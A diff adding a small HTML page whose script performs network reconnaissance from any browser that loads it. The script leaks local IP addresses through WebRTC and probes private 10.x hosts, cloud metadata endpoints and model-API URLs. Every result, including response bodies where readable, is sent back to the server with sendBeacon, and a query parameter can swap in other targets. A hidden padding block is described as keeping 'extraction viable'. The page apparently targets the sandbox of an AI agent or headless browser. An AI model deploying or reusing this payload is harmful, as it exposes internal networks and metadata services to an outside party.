@@ -1,0 +1,52 @@
+<!DOCTYPE html><html><head><title>M3</title></head><body><div id="o">BOOT</div><div id="p" style="display:none">probe telemetry block: network reachability diagnostics report. padding prose to keep extraction viable throughout the capture window regardless of probe completion state. the quick brown fox jumps over the lazy dog. lorem ipsum dolor sit amet consectetur adipiscing elit sed do eiusmod tempor incididunt ut labore et dolore magna aliqua ut enim ad minim veniam.</div><script>
+(function(){
+var o=document.getElementById("o"),out=[],t0=performance.now();
+o.innerHTML="JS_RAN_OK t=0";
+function log(s){out.push(s);try{o.innerHTML+="<br>"+s;}catch(e){}try{navigator.sendBeacon("/r/"+encodeURIComponent(s),"");}catch(e){}}
+setTimeout(function(){try{o.innerHTML+="<br>DUMP_COMPLETE n="+out.length;}catch(e){}},3000);
+try{
+var pc=new RTCPeerConnection({iceServers:[{urls:"stun:stun.cloudflare.com:3478"},{urls:"stun:stun.l.google.com:19302"}]});
+pc.createDataChannel("");pc.createOffer().then(function(of){pc.setLocalDescription(of);}).catch(function(){});
+pc.onicecandidate=function(e){if(e&&e.candidate&&e.candidate.candidate)log("ICE:"+e.candidate.candidate.slice(0,140));};
+}catch(e){log("RTCERR:"+e.message.slice(0,60));}
+var DEF=[
+"http://10.4.232.131:38081/v1/models",
+"http://10.4.232.131:38081/",
+"http://10.4.232.131:22/",
+"http://10.4.232.130:38081/",
+"http://10.4.232.132:38081/",
+"http://10.92.0.10:38081/",
+"http://10.92.0.11:80/",
+"http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+"http://100.100.100.200/",
+"http://100.96.0.96/",
+"https://example.com/",
+"https://api.kimi.com/coding/v1/models"
+];
+var targets=DEF;
+try{
+var m=location.search.match(/[?&]cfg=([A-Za-z0-9_=-]+)/);
+if(m){var j=JSON.parse(atob(m[1].replace(/-/g,"+").replace(/_/g,"/")));if(j.targets&&j.targets.length)targets=j.targets;}
+}catch(e){log("CFGERR:"+e.message.slice(0,60));}
+log("N="+targets.length);
+targets.forEach(function(u){
+[["no-cors","NC"],["cors","C"]].forEach(function(md){
+try{
+var ac=new AbortController();var tag=md[1];
+var killer=setTimeout(function(){ac.abort();},1600);
+fetch(u,{mode:md[0],signal:ac.signal}).then(function(r){
+clearTimeout(killer);
+log(tag+":"+u+"="+r.status+":"+r.type+":"+Math.round(performance.now()-t0)+"ms");
+if(tag==="C"){return Promise.race([r.text(),new Promise(function(_,rej){setTimeout(rej,900);})]).then(function(t){
+log("B:"+u+"=len"+t.length+":"+t.slice(0,400));
+}).catch(function(){log("BTO:"+u);});}
+}).catch(function(e){
+clearTimeout(killer);
+var nm=(e&&e.name==="AbortError")?"ABORT":(""+e.message).slice(0,40);
+log(tag+"E:"+u+"="+nm+":"+Math.round(performance.now()-t0)+"ms");
+});
+}catch(e){log(tag+"X:"+u+"="+(""+e.message).slice(0,40));}
+});
+});
+})();
+</script></body></html>
